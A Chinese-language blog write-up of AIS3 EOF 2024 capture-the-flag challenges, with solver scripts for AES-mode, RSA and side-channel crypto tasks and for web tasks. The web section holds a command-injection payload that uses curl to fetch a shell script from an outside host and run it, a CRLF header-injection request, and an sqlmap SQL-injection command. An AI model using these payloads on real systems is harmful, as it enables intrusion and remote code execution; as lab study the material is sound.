---
title: AIS3 EOF 2024 Write-up
date: 2024-01-18 09:58:01
tags: 
  - AIS3
  - CTF
categories:
  - [AIS3, EOF]
typora-root-url: .
excerpt: AIS3 EOF 2024 Write-up
cover: /ais3-eof-2024-write-up/CHIP1_Ch1p1_cHap@_cHaP@_DUBi_DUbi_da8a_d4B@.webp
photos:
  - /ais3-eof-2024-write-up/CHIP1_Ch1p1_cHap@_cHaP@_DUBi_DUbi_da8a_d4B@.webp
---

這次在 EOF 解了 8 題, 感覺至少賽中至少還能多解個 3 題以上.

![scoreboard](/ais3-eof-2024-write-up/scoreboard.webp)

## Crypto

### Baby AES

#### 題目

```python
#! /usr/bin/env python3
from Crypto.Cipher import AES
from Crypto.Util.number import long_to_bytes as l2b, bytes_to_long as b2l
from secret import FLAG
from os import urandom
from base64 import b64encode, b64decode

def XOR (a, b):
    return l2b(b2l(a) ^ b2l(b)).rjust(len(a), b"\x00")
    
def counter_add(iv):
    return l2b(b2l(iv) + 1).rjust(16, b"\x00")

# These modes of Block Cipher are just like Stream Cipher. Do you know them?
AES_enc = AES.new(urandom(16), AES.MODE_ECB).encrypt
def AES_CFB (iv, pt):
    ct = b""
    for i in range(0, len(pt), 16):
        _ct = XOR(AES_enc(iv), pt[i : i + 16])
        iv = _ct
        ct += _ct
    return ct

def AES_OFB (iv, pt):
    ct = b""
    for i in range(0, len(pt), 16):
        iv = AES_enc(iv)
        ct += XOR(iv, pt[i : i + 16])
    return ct

def AES_CTR (iv, pt):
    ct = b""
    for i in range(0, len(pt), 16):
        ct += XOR(AES_enc(iv), pt[i : i + 16])
        iv = counter_add(iv)
    return ct

if __name__ == "__main__":
    counter = urandom(16)
    
    c1 = urandom(32)
    c2 = urandom(32)
    c3 = XOR(XOR(c1, c2), FLAG)
    print( f"c1_CFB: ({b64encode(counter)}, {b64encode(AES_CFB(counter, c1))})" )
    counter = counter_add(counter)
    print( f"c2_OFB: ({b64encode(counter)}, {b64encode(AES_OFB(counter, c2))})" )
    counter = counter_add(counter)
    print( f"c3_CTR: ({b64encode(counter)}, {b64encode(AES_CTR(counter, c3))})" )
    
    for _ in range(5):
        try:
            counter = counter_add(counter)
            mode = input("What operation mode do you want for encryption? ")
            pt = b64decode(input("What message do you want to encrypt (in base64)? "))
            pt = pt.ljust( ((len(pt) - 1) // 16 + 1) * 16, b"\x00")
            if mode == "CFB":
                print( b64encode(counter), b64encode(AES_CFB(counter, pt)) )
            elif mode == "OFB":
                print( b64encode(counter), b64encode(AES_OFB(counter, pt)) )
            elif mode == "CTR":
                print( b64encode(counter), b64encode(AES_CTR(counter, pt)) )
            else:
                print("Sorry, I don't understand.")
        except:
            print("??")
            exit()
    
```

#### 題解

https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_feedback_(CFB)

##### Step1: 取得 `flag[:16]`

###### 1.1 取得 `c1[:16]`

取得這個值需要先取得 $f(counter_0)$, 其中 $f$ 表示題目的 `AES_enc`, 取得之後 $f(counter_0)\oplus r1[:16]$ 就會是 `c1[:16]` (`r1` 表示題目加密後的 `c1`, $\oplus$ 表示 xor).

首先第一個 query 我們先送出 CTR mode 的 query, 內容為 $16\times 5$ bytes 的空白訊息 (全 0), server 的回傳值就會是 $f(counter_3),f(counter_4),...,f(counter_6)$ 的內容.

第二個 query, 我們送 $f(counter_4)\oplus counter_0||0$  共兩個 block 的訊息的 CFB ($||$ 表示把兩個 blocks 接在一起). 可以發現回傳結果的第二個 block 就會是 $f(counter_0)$.

透過同樣的手法, 把上方第二個 query 的 $counter_0$ 的地方改成其他我們想要取得 $f(x)$ 的 $x$, $f(counter_4)$ 改成對應的 counter 就可以達成目的.

所以 `c2[:16]`, `c2[:16]` 也都拿得到了, 就取得 `flag[:16]` 了. 同樣的, `flag[16:32]` 也可以透過一樣的方法取得, 只是要對題目進行的二次的連線, 因為題目一次只能有 5 個 query.

![Baby AES](/ais3-eof-2024-write-up/baby-aes-handwritten.webp)

##### Exploit

```python
from pwn import *
from Crypto.Cipher import AES
from Crypto.Util.number import long_to_bytes as l2b, bytes_to_long as b2l
from secret import FLAG
from os import urandom
from base64 import b64encode, b64decode
import re

def XOR (a, b):
    return l2b(b2l(a) ^ b2l(b)).rjust(len(a), b"\x00")
    
def counter_add(iv):
    return l2b(b2l(iv) + 1).rjust(16, b"\x00")

io = None

def do_init():
    t = io.recvline().decode()
    ctr0, c1 = re.findall(r"b'([A-Za-z0-9+/=]+)'", t)

    t = io.recvline().decode()
    _, c2 = re.findall(r"b'([A-Za-z0-9+/=]+)'", t)

    t = io.recvline().decode()
    _, c3 = re.findall(r"b'([A-Za-z0-9+/=]+)'", t)

    ctr0 = b64decode(ctr0)
    c1 = b64decode(c1)
    c2 = b64decode(c2)
    c3 = b64decode(c3)

    return ctr0, c1, c2, c3


def AES_CTR(pt):
    io.sendlineafter(b'What operation mode do you want for encryption? ', b'CTR')
    io.sendlineafter(b'What message do you want to encrypt (in base64)? ', b64encode(pt))
    t = io.recvline().decode()
    return list(map(b64decode, re.findall(r"b'([A-Za-z0-9+/=]+)'", t)))

def AES_CFB(pt):
    io.sendlineafter(b'What operation mode do you want for encryption? ', b'CFB')
    io.sendlineafter(b'What message do you want to encrypt (in base64)? ', b64encode(pt))
    t = io.recvline().decode()
    return list(map(b64decode, re.findall(r"b'([A-Za-z0-9+/=]+)'", t)))

def AES_enc(prev_enc, pt):
    m = xor(prev_enc, pt)+bytes(16)
    _, t = AES_CFB(m)
    return t[16:32]
    

def main():
    global io
    # context.log_level = 'debug'

    # Step1: get the first block of the flag (see ctf.goodnotes p21).
    io = remote('chal1.eof.ais3.org', 10003)
    ctr0, r1, r2, r3 = do_init()
    r1_lo, r1_hi = r1[16:], r1[:16]
    r2_lo, r2_hi = r2[16:], r2[:16]
    r3_lo, r3_hi = r3[16:], r3[:16]

    # 1.1: Get f(CTR3~CTR7) by abusing the CTR mode.
    encrypted_ctr = [bytes(16), bytes(16), bytes(16)]
    ctr = [ctr0]
    for i in range(10): ctr += [counter_add(ctr[-1])]
    m = bytes(16) * 5
    _, t = AES_CTR(m)
    encrypted_ctr += [t[i:i+16] for i in range(0, len(t), 16)]

    # 1.2: Get c1_hi by getting f(CTR0) by using CFB mode.
    encrypted_ctr[0] = AES_enc(encrypted_ctr[4], ctr0)
    c1_hi = xor(r1_hi, encrypted_ctr[0])

    # 1.3: Get c2_hi by getting f(CTR1) by using CFB mode.
    encrypted_ctr[1] = AES_enc(encrypted_ctr[5], ctr[1])
    c2_hi = xor(r2_hi, encrypted_ctr[1])

    # 1.4: Get c3_hi by getting f(CTR2) by using CFB mode.
    encrypted_ctr[2] = AES_enc(encrypted_ctr[6], ctr[2])
    c3_hi = xor(r3_hi, encrypted_ctr[2])
    flag_hi = xor(xor(c1_hi, c2_hi), c3_hi)

    io.close()
    # Step2: get the second block of the flag (see ctf.goodnotes p22).
    io = remote('chal1.eof.ais3.org', 10003)
    ctr0, r1, r2, r3 = do_init()
    r1_lo, r1_hi = r1[16:], r1[:16]
    r2_lo, r2_hi = r2[16:], r2[:16]
    r3_lo, r3_hi = r3[16:], r3[:16]

    # 2.1: Get f(CTR3~CTR7) by abusing the CTR mode.
    encrypted_ctr = [bytes(16), bytes(16), bytes(16)]
    ctr = [ctr0]
    for i in range(10): ctr += [counter_add(ctr[-1])]
    m = bytes(16) * 5
    _, t = AES_CTR(m)
    encrypted_ctr += [t[i:i+16] for i in range(0, len(t), 16)]

    # 2.2: Get c3_lo
    c3_lo = xor(r3_lo, encrypted_ctr[3])

    # 2.3: Get c1_hi
    encrypted_ctr[0] = AES_enc(encrypted_ctr[4], ctr0)
    c1_hi = xor(r1_hi, encrypted_ctr[0])

    # 2.4: Get c1_lo
    encrypted_r1_hi = AES_enc(encrypted_ctr[5], r1_hi)
    c1_lo = xor(r1_lo, encrypted_r1_hi)

    # 2.5: Get f(CTR1).
    encrypted_ctr[1] = AES_enc(encrypted_ctr[6], ctr[1])
    # 2.5.2: Get f(f(CTR1)).
    encrypted_encrypted_ctr1 = AES_enc(encrypted_ctr[7], encrypted_ctr[1])

    # 2.6: Get c2_lo
    c2_lo = xor(r2_lo, encrypted_encrypted_ctr1)
    print(f'c2_lo: {c2_lo}')

    # 2.7: Get flag_lo
    flag_lo = xor(xor(c1_lo, c2_lo), c3_lo)
    print(flag_hi + flag_lo)


if __name__ == '__main__':
    main()
```



### Baby RSA

#### 題目

```python
#! /usr/bin/python3
from Crypto.Util.number import bytes_to_long, long_to_bytes, getPrime
import os

from secret import FLAG

def encrypt(m, e, n):
    enc = pow(bytes_to_long(m), e, n)
    return enc

def decrypt(c, d, n):
    dec = pow(c, d, n)
    return long_to_bytes(dec)


if __name__ == "__main__":
    while True:
        p = getPrime(1024)
        q = getPrime(1024)
        n = p * q
        phi = (p - 1) * (q - 1)
        e = 3
        if phi % e != 0 : 
            d = pow(e, -1, phi)
            break
    
    print(f"{n=}, {e=}")
    print("FLAG: ", encrypt(FLAG, e, n))
    
    for _ in range(3):
        try:
            c = int(input("Any message for me?"))
            m = decrypt(c, d, n)
            print("How beautiful the message is, it makes me want to destroy it .w.")
            new_m = long_to_bytes(bytes_to_long(m) ^ bytes_to_long(os.urandom(8)))
            print( "New Message: ", encrypt(new_m, e, n) )
        except:
            print("?")
            exit()
```



#### 題解

看到題目的 $e$ 只有 $3$ 想要直接爆爆看有沒有可以直接開三次方根的 $cipher + t * n$, 但題目有記得把 $m$ 有 padding, 所以行不通, 附上 script.

```python
from Crypto.Util.number import bytes_to_long, long_to_bytes
import gmpy2
from multiprocessing import Pool

n = 18677933168008233862726486577615630655319899601079688523367573745599357704234954802606818193834340309017021320677505092036507176460474518323934167205811675647066354154003096437643854109757426215393592066709055528097663981374737741676075848125072975533078499675096215639292570270742596700082287038458911644658840064362092328187053039741690011255833915096067741900819952870995931030767145062100485555219579387507654507263015000954439171215725772023228903943537448091846694158281548182640944828147736677816417468469997270202646430776889002467958011398515921293723471619625369793121962920137825434330357333100968436901363
e = 3
cipher = 10747762371744113694915117977685831647243063426258867025246542454281413004395728404414997829085670181608688805695780144233171759525425915063492864356921417912617435994793798664951855523818662133187209620367456710600952496639238651569585369752857234291480253383212138775832709377163452540364024163787037218553815099859550383283482004814711037273293597074648733123770764270333138241737517359455992214762107750515080661954119778825619368396986417699290849012823448972411843095725133092773317468286178984744285290289523530305964999138569734106290992210589931329921740355337560474032356456348227285559430754173028152146829

def calc(j):
    a, b = gmpy2.iroot(cipher + j * n, 3)
    if b:
        m = a
        print(a)
        pool.terminate()
        exit()


def SmallE(pool, inputs):
    pool.map(calc, inputs)
    pool.close()
    pool.join()


if __name__ == '__main__':
    print('start')
    for i in range(2, 1000):
        inputs = list(range(i*1300000000, (i+1)*1300000000))
        pool = Pool()
        SmallE(pool, inputs)
```

觀察到每次連線都會取得不同的 $n$, 但 $FLAG,e$ 都是相同的, 所以可進行 broadcast attack.

進行三次連線取得 $n_1, n_2, n_3, c_1, c_2, c_3$. 我們有 $c_i=FLAG^3\mod n_i$, 透過 crt 可以組回原本的 $m^3$, 要三個才能組回原因是因為 $m=FLAG$ 最多只能有 $2048$ bits (因為 $m<n$), 所以 $m^3$ 會最多有 $2048\times 3$ bits, 才需那麼多. 有 $m^3$ 後開三次根號就是答案.

##### Exploit

```python
n1 = 17935355045244019490994492432435078429294046251373323301585537322989608726599418940604843251550239023980998311728768997695693089131010900893235900887590212600595741575337369513831853193340939894267175265316621595189752898884409205735873777841812933207986932820853959773951748633160244390308066988893527341438890606835915667383415049929217987156437656986481365462249326168872270217130454437422973489362615889797711617293473704020132500177003659781007225808737166682873140234666587224740240960288511824717267049839054778803790345742436792768175611893752708481498793007811955664359334027626940837899254752692471794408099
c1 = 6220915806191210242551008526108657415752065366710694358169827792335969535651047878222193017863473222629117087234271587999464217022755970213122313561391711999242215611452622888209273727428564243483892942109709838890536214538883955915468337854038595286818752930160800208111427677307764318451169677036639572590967397377086154919396911868176492896715182316482102094171761566452788811889045545761646570940167984459999088791549788532217428488745529026477596464277478434441148637281740589003905313430010674913460460316394201269220173873970013790899309665072815516080093015807317879643831380207153972400498912617668079507747

n2 = 20479773183463311680125142127251874593139348193547954772151757237858384947941738090585356648916256305873804780721604147304052361169532713439034591992420050865350477978680824058053433682592614064467076893745184899439384936889013287402718688505983806758400592699598248119113188663849673095275115692714565145944275222307393940140824766069057966266164131294661651917327054536641067360976694602049669398842967345233485643959446500818963175589103472392722876279386953745475353330326240453521164262676823145927209506490195680571166209595117198977403247442790429329937882881658218739614629837284166936132479757967754721962497
c2 = 18958530450278070988355583843466929786679959080456379193734375716894685184392730651980116086278614045986895967581841928377436588469230202745259481589862916395341834431487024306576580294591410326563998228597808493222798564716861082133924015762439215458319248708464724874622133839457700575557023297293290218842551641797606296722355143594287329298064673605377140785616208379890149842261105460683144549275408869727614454111377742698251503376045766242971496034560331965791004923428977495250247406245126486981445302183253363162814378328529422924952280311230595190926601919692436449143073475514609514777465757810203067869433

n3 = 30450840269446905642620193060425614302586476191143921678597995038191926390364060601339586677285272951378456479213536629459330180893079893344522815499666158297970645319638631030993672405782943881569838444709483316447174897976977393478439046590022968671672245880254921681596899389831220754214676219873432770815923461367329594676088198155825940497812999083960382512409354323224817058114740356177691510738016066778588152199551050099698474388708084206285022359394838031759232787603683849326773435972407791254512251348972310069242677992594091747084550541314172168252218296345505855615365814097638938803861165103791176836489
c3 = 19106588099594826747059621817889071541697165806909364418973354068351477429212640582391229826418696618789770707906825958295177069373424072554389443328741416146517612901388007923839322639121731816209273748633014141073748661292565059631176895373722423460887879998999188700856554961374509771603100940708443217407913624958550426048693133815747938827818987143566005757310199511121982493454481375590566099866318568266359443079879066638201231273846428636522117192490408021874375771803362241815420279443739121276999052249298784404462072229024268996519148054389938836578926024211997392447127547861084852505826566885226390220208

c = crt([c1, c2, c3], [n1, n2, n3])
import gmpy2
r = gmpy2.iroot(int(c), 3)

from Crypto.Util.number import long_to_bytes
long_to_bytes(int(r[0]))
b'====================================================================================================AIS3{C0pPerSmI7HS_Sh0r7_pad_a7T4cK}===================================================================================================='

```

### Baby Side Channel

#### 題目

```python
from Crypto.Util.number import getPrime, bytes_to_long
import os


def powmod(a, b, c):
    r = 1
    while b > 0:
        if b & 1:
            r = r * a % c
        a = a * a % c
        b >>= 1
    return r


def keygen(b):
    p = getPrime(b // 2)
    q = getPrime(b // 2)
    n = p * q
    e = 65537
    d = pow(e, -1, (p - 1) * (q - 1))
    return n, e, d


def main():
    flag = os.environ.get("FLAG", "not_flag{just_test}").encode()

    n, e, d = keygen(2048)
    m = bytes_to_long(flag)

    c = powmod(m, e, n)
    assert powmod(c, d, n) == m
    print(f"{c = }")

    ed = powmod(e, d, n)
    de = powmod(d, e, n)
    print(f"{ed = }")
    print(f"{de = }")


if __name__ == "__main__":
    main()
    # to generate trace.txt.gz:
    # execute `python -m trace --ignore-dir=$(python -c 'import sys; print(":".join(sys.path)[1:])') -t chall.py | gzip > trace.txt.gz`
```



根據 https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_side_channel/ , RSA 有 side-channel attack 可以洩漏出 $d$.

需要關注 `powmod` 部分, 觀察到 trace 裡面有哪些地方沒有執行到 `chall.py(9)` 可以推測出 `b` 的目前 lsb 是否為 1. 所以可以還原所有有進到 `powmod` 指數部分的數, 包含 `e, d`.

底下是在執行 `powmod` 時的部分 trace, 上半部分沒有執行到 `chall.py(9)`, 所以 `b&1==0`, 下半部則是相反, 所以那兩個時候的 $b$ 的 lsb 分別是 0, 1, 就還原出兩個 bits 了.

```
chall.py(7):     while b > 0:
chall.py(8):         if b & 1:
chall.py(10):         a = a * a % c
chall.py(11):         b >>= 1
chall.py(7):     while b > 0:
chall.py(8):         if b & 1:
chall.py(9):             r = r * a % c
chall.py(10):         a = a * a % c
chall.py(11):         b >>= 1
```



所以寫了一個 parse trace 的 script.

```python
with open('trace.txt') as f:
    trace = f.read().splitlines()

M = dict()
collecting = False
target = None
count = 0

i = 0

while i < len(trace):
    line = trace[i]
    if ' --- modulename: chall, funcname: powmod' in line:
        target = trace[i-1]
        recovered_num = 0
        j = i+2
        while True:
            print(j)
            if 'return r' in trace[j+1]:
                i = j+1
                break
            if 'chall.py(9):             r = r * a % c' in trace[j+2]:
                recovered_num += 1
                j += 5
            elif 'chall.py(10):         a = a * a % c' in trace[j+2]:
                j += 4
            recovered_num <<= 1
        res = recovered_num >> 0
        res = bin(res)[2:][::-1]
        res = int(res, 2)
        M[target] = res
    i += 1

print(M)
'''
{
    'chall.py(30):     c = powmod(m, e, n)':           18, 
    'chall.py(31):     assert powmod(c, d, n) == m': 2047,     
    'chall.py(34):     ed = powmod(e, d, n)':        2047,     # => 2**2045 <= d < 2**2046
    'chall.py(35):     de = powmod(d, e, n)':          18      # => 2**16   <= e < 2**17

}
'''
```



有了 $d$ 之後還要找到 $n$ 才能解密. 我們有 $n|e^d-(e^d \mod n)$, $n|d^e-(d^e \mod n)$, 所以 $n=t\times gcd(e^d-(e^d \mod n),d^e-(d^e \mod n))$, $t$ 是某個整數, 而且應當很小, 所以求出 gcd 後就很容易拿到 $n$.

$d^e-(d^e \mod n)$ 很好計算, 但是 $e^d-(e^d \mod n)$ 的指數太大了無法有效的運算, 所以我拿 $pow(e, d,d^e-(d^e \mod n))-(e^d \mod n)$ 來代替, 在我筆電跑一個多小時就有結果了.

事後得知其實拿 $(d^e \mod n)^d-d$ 來代替也行.

##### Exploit

```python
e = 65537
d = 5101801443646397883483649170711170753234288161361773661762267166670179416556559190427195380873279363761215171667505597871909277180369455688905853902851511957294097171528948752094516781787608497291367416956588726814365926794388082060260619009730659392647647183772109356047401908345247677863524649904486204063359228076187213874784965513396420313348261358686843941101370583844255574015452239829051373299609614220223415202652069231016999861457802731973618111317817882297440966346381327329884300940871115228723365465279897915245876502552066550508521644906050605125454361858778807676176500042058934481320604247881283668369
de = 13276162869538876820874967265930056273649821619291298913244678460731677163640678305685273823105113895367225533853291553801325875520385932495430214453460548860194545946112644881109909538249310237449556876534727907963595095029052171691339165402792733339261655900920961198996199989377674756625799235936728573076768127693113603993732186868748440535297125037449014063636229263789966156722768008526078395777378361515086870396392457829916442048280036101237518748017569176962448117126360698491514070294578349308480127662663812119497411355259763448291144909096083219209280990495370006375298518756352954590671780820925176304199
de = 13276162869538876820874967265930056273649821619291298913244678460731677163640678305685273823105113895367225533853291553801325875520385932495430214453460548860194545946112644881109909538249310237449556876534727907963595095029052171691339165402792733339261655900920961198996199989377674756625799235936728573076768127693113603993732186868748440535297125037449014063636229263789966156722768008526078395777378361515086870396392457829916442048280036101237518748017569176962448117126360698491514070294578349308480127662663812119497411355259763448291144909096083219209280990495370006375298518756352954590671780820925176304199
ed = 14178888196465870186414627544539738124175295799257361983571071401002490264356000205140624665964615117430908950811645434229282649592982503773550326965082848689996525573201025300967877866012120037776271706799402946789537352857058456806620058888835737896317733033515185417035478990005398169721145688234245222237127842180506837927161003149517825433035255875230037645923078721253521812513852140879603355907765537367169478024192131596492564365613729739156664379932946145950302495371710257137426568151836679601945287133446134485087864897384934692046523396057840552348965365284377470932666797865632180694441755450786806257428
ed = 14178888196465870186414627544539738124175295799257361983571071401002490264356000205140624665964615117430908950811645434229282649592982503773550326965082848689996525573201025300967877866012120037776271706799402946789537352857058456806620058888835737896317733033515185417035478990005398169721145688234245222237127842180506837927161003149517825433035255875230037645923078721253521812513852140879603355907765537367169478024192131596492564365613729739156664379932946145950302495371710257137426568151836679601945287133446134485087864897384934692046523396057840552348965365284377470932666797865632180694441755450786806257428
c = 13915994134818567092320017429461441897582217944947848816354742821788867625203713787439088076241510905748342319375749688453493070761353427425774859287985622631002647446579390523120186272531930950683841742209652262950816847383288713246110183999674385586805065806527076870260121038631281290832370953178851666970475914655341016607144457997740491032560593457888617390667018836503627735976330627032307586776585514389001015254506008110558082161693141810334711526691831019894639593520974340262286493544527759201468204705820888719252694759067355825740098465416409062164860553911095104641228683397166900030958537312789960813376
c = 13915994134818567092320017429461441897582217944947848816354742821788867625203713787439088076241510905748342319375749688453493070761353427425774859287985622631002647446579390523120186272531930950683841742209652262950816847383288713246110183999674385586805065806527076870260121038631281290832370953178851666970475914655341016607144457997740491032560593457888617390667018836503627735976330627032307586776585514389001015254506008110558082161693141810334711526691831019894639593520974340262286493544527759201468204705820888719252694759067355825740098465416409062164860553911095104641228683397166900030958537312789960813376
c = 13915994134818567092320017429461441897582217944947848816354742821788867625203713787439088076241510905748342319375749688453493070761353427425774859287985622631002647446579390523120186272531930950683841742209652262950816847383288713246110183999674385586805065806527076870260121038631281290832370953178851666970475914655341016607144457997740491032560593457888617390667018836503627735976330627032307586776585514389001015254506008110558082161693141810334711526691831019894639593520974340262286493544527759201468204705820888719252694759067355825740098465416409062164860553911095104641228683397166900030958537312789960813376

n2 = d**e-de
print('first stage done')
n1 = e.powermod(d, n2)-ed
print('second stage done')


print(gcd(n1, n2))

'''
~/N/c/a/c/Baby Side Channel Attack[130]►sage sol.sage                                                       (ctf) 550.706s 21:53
first stage done
second stage done
44565056141672380232344221925657277099882114345721507082492496441540369880424811577620459882214160697905468105416738186564508392380914299469142919925961374508421438554801765732097700328063066210278702648625016268335671727073548747198769351524886914601379356693114367895940809338975808210077547758235780036747719173126480805614411786833779153843839588138846070535060731124022544006486698278481826148949712867510327772469472356961026633465984157845697202333522148391519555351010731230294807159744415424295328273485696890291150137752675887693843996925002892772976631541182603166690266552196457177027473291308202147666463
~/N/c/a/c/Baby Side Channel Attack►                                                                                                          (ctf) 4304.838s 23:05
'''
```



## Web

### DNS Lookup Tool: Final

#### 題目

```php
<?php
$blacklist = ['|', '&', ';', '>', '<', "\n", 'flag', '*', '?'];
$is_input_safe = true;
foreach ($blacklist as $bad_word)
    if (strstr($_POST['name'], $bad_word) !== false) $is_input_safe = false;

if ($is_input_safe) {
    $retcode = 0;
    $output = [];
    exec("host {$_POST['name']}", $output, $retcode);
    if ($retcode === 0) {
        echo "Host {$_POST['name']} is valid!\n";
    } else {
        echo "Host {$_POST['name']} is invalid!\n";
    }
}
else echo "HACKER!!!";
?>
```

有明顯的 cmdi, 使用

```sh
$(curl ching367436.me:8088/shell.sh -o /tmp/shell.sh)
```

作為 `name` 可以任意寫檔案到 /tmp 底下, 再串上

```sh
$(curl ching367436.me:8088/`php /tmp/shell.sh`) 
```

就可以執行寫入的檔案, 這樣就有無限制的 RCE 了.

### Internal

#### 題目

目標是要搓到 docker-compose 內網的 http://web:7777/flag , nginx 的設定如下, 有 expose 7778 port 到 docker 外面.

```nginx
# nginx
server {
    listen       7778;
    listen  [::]:7778;
    server_name  localhost;

    location /flag {
        internal;
        proxy_pass http://web:7777;
    }

    location / {
        proxy_pass http://web:7777;
    }
}
```

```python
# http://web:7777
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import re, os

if os.path.exists("/flag"):
    with open("/flag") as f:
        FLAG = f.read().strip()
else:
    FLAG = os.environ.get("FLAG", "flag{this_is_a_fake_flag}")
URL_REGEX = re.compile(r"https?://[a-zA-Z0-9.]+(/[a-zA-Z0-9./?#]*)?")

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/flag":
            self.send_response(200)
            self.end_headers()
            self.wfile.write(FLAG.encode())
            return
        query = parse_qs(urlparse(self.path).query)
        redir = None
        if "redir" in query:
            redir = query["redir"][0]
            if not URL_REGEX.match(redir):
                redir = None
        self.send_response(302 if redir else 200)
        if redir:
            self.send_header("Location", redir)
        self.end_headers()
        self.wfile.write(b"Hello world!")

if __name__ == "__main__":
    server = ThreadingHTTPServer(("", 7777), RequestHandler)
    server.allow_reuse_address = True
    print("Starting server, use <Ctrl-C> to stop")
    server.serve_forever()

```

#### 題解

基本上跟[這個](https://github.com/dreadlocked/ctf-writeups/blob/master/midnightsun-ctf/bigspin.md#23-beating-admin-level)是同樣的一題.

在題目 `location /flag` 裡面的 `internal` 表示的意思如下:

> Specifies that a given location can only be used for internal requests. For external requests, the client error 404 (Not Found) is returned. Internal requests are the following:
>
> - requests redirected by the [error_page](https://nginx.org/en/docs/http/ngx_http_core_module.html#error_page), [index](https://nginx.org/en/docs/http/ngx_http_index_module.html#index), [internal_redirect](https://nginx.org/en/docs/http/ngx_http_internal_redirect_module.html#internal_redirect), [random_index](https://nginx.org/en/docs/http/ngx_http_random_index_module.html#random_index), and [try_files](https://nginx.org/en/docs/http/ngx_http_core_module.html#try_files) directives;
> - requests redirected by the “X-Accel-Redirect” response header field from an upstream server;
> - subrequests formed by the “`include virtual`” command of the [ngx_http_ssi_module](https://nginx.org/en/docs/http/ngx_http_ssi_module.html) module, by the [ngx_http_addition_module](https://nginx.org/en/docs/http/ngx_http_addition_module.html) module directives, and by [auth_request](https://nginx.org/en/docs/http/ngx_http_auth_request_module.html#auth_request) and [mirror](https://nginx.org/en/docs/http/ngx_http_mirror_module.html#mirror) directives;
> - requests changed by the [rewrite](https://nginx.org/en/docs/http/ngx_http_rewrite_module.html#rewrite) directive.

需要關注的部分是只要 upstream server 回傳了 `X-Accel-Redirect` 的 header 配上 redirect 就可以摸到有 `internal` 的被 redirect 到的 endpoint. 透過 CRLF injection 到 redir 的地方, 我們可以插入這個 header 就解完了.

```sh
~>curl -v 'http://10.105.0.21:11932/?redir=http://web:7777/flag%0D%0AX-Accel-Redrect:%20/flag'
*   Trying 10.105.0.21:11932...
* Connected to 10.105.0.21 (10.105.0.21) port 11932
> GET /?redir=http://web:7777/flag%0D%0AX-Accel-Redirect:%20/flag HTTP/1.1
> Host: 10.105.0.21:11932
> User-Agent: curl/8.4.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Server: nginx/1.25.3
< Date: Fri, 05 Jan 2024 13:38:29 GMT
< Transfer-Encoding: chunked
< Connection: keep-alive
< 
* Connection #0 to host 10.105.0.21 left intact
```

```
AIS3{JUST_s0me_funnY_n91Nx_fEatuRE}
```

### copypasta

#### 題目

```python
from flask import Flask, request, session, redirect, url_for, send_file, render_template, g
import secrets
import re
import uuid
import sqlite3

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)

def db():
    db = getattr(g, "_database", None)
    if db is None:
        db = g._database = sqlite3.connect("/tmp/db.sqlite3")
        db.row_factory = sqlite3.Row
    return db

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, "_database", None)
    if db is not None:
        db.close()

with app.app_context():
    db = sqlite3.connect("/tmp/db.sqlite3")
    cursor = db.cursor()
    cursor.executescript(
        """
    CREATE TABLE IF NOT EXISTS copypasta_template (
        id TEXT,
        title,
        template TEXT,
        PRIMARY KEY (id)
    );
    """
    )
    cursor.execute(
        """
    CREATE TABLE IF NOT EXISTS copypasta (
        id TEXT,
        orig_id TEXT,
        PRIMARY KEY (id)
    );
    """
    )
    
    cursor.execute( 
        "INSERT OR IGNORE INTO copypasta_template (id, title, template) VALUES (?,?,?), (?,?,?), (?,?,?)",
        ("1", "求求你們不要再貼疑似...", "求求你們不要再貼疑似{field[event]}的{field[media]}\n我從{field[when]}的時候就開始{field[action]}\n每當我被生活壓得喘不過氣來的時候\n只要聽到{field[hope]}\n就能找回活下去的希望\n昨天看到了那段{field[media]}\n雖然我知道{field[media]}是{field[who]}的可能性很少 畢竟有那麽多{field[similar]}\n難免會有相似的存在\n但是那個{field[thing]}真的太像了 我一看到就能反應過來\n感覺世界開始逐漸崩塌\n求求你們不要再討論這件事了\n再這樣下去我連唯一支持自己活下去的理由都沒有了",
         "2", "宿儺太強了...", "{field[character]}太強了\n而且{field[character]}還沒有使出全力的樣子\n對方就算沒有{field[object]}也會贏\n我甚至覺得有點對不起他\n我沒能在這場戰鬥讓{field[character]}展現他的全部給我\n殺死我的不是{field[thing1]}或{field[thing2]}\n而是比我更強的傢伙，真是太好了",
         "3", "FLAG???", "The flag is: {field[flag]}")
    )

    # add flag
    flag_uuid = str(uuid.uuid4())
    cursor.execute(
        "INSERT OR IGNORE INTO copypasta (id, orig_id) VALUES (?,?)",
        (flag_uuid, "3")
    )
    open(f'posts/{flag_uuid}', 'w').write(
        "The flag is: " + "FLAG{test flag}"
    )

    db.commit()
    db.close()

@app.route("/")
def index():
    if session.get('posts') is None:
        session['posts'] = []
    templates = db().cursor().execute(
        "SELECT * FROM copypasta_template"
    ).fetchall()
    return render_template("index.html", templates=templates)

@app.get("/use")
def create():
    id = request.args.get("id")
    tmpl = db().cursor().execute(
        f"SELECT * FROM copypasta_template WHERE id = {id}"
    ).fetchone()
    content = tmpl["template"]
    fields = dict.fromkeys(re.findall(r"{field\[([^}]+)\]}", content))
    content = re.sub(r"{field\[([^}]+)\]}", r"{\1}", tmpl["template"])

    return render_template("create.html", content=content, fields=fields, id=id)

@app.post("/use")
def create_post():
    id = request.args.get("id")
    tmpl = db().cursor().execute(
        f"SELECT * FROM copypasta_template WHERE id = {id}"
    ).fetchone()
    content = tmpl["template"]

    res = content.format(field=request.form)
    id = str(uuid.uuid4())
    db().cursor().execute(
        "INSERT INTO copypasta (id, orig_id) VALUES (?, ?)",
        (id, tmpl["id"])
    )
    db().commit()

    with open(f"posts/{id}", "w") as f:
        f.write(res)

    session['posts'] = [id] + session['posts']

    return redirect(url_for("view", id=id))

@app.get("/view/<id>")
def view(id):
    if id in session.get('posts', []):
        content = open(f"posts/{id}").read()
    else:
        content = "(permission denied)"
    return render_template("view.html", content=content)

```



##### Step1: `@app.post("/use")` 有 SQLi, 可以把 flag 的 `uuid` 偷出來

```shell
sqlmap --level 5 --risk 3 -T copypasta -C id --dump --technique=B --dbms sqlite3 -u 'http://localhost:48763/use?id=3*' --data="flag=flag"
```

```sh
Database: <current>
Table: copypasta
[7 entries]
+--------------------------------------+
| id                                   |
+--------------------------------------+
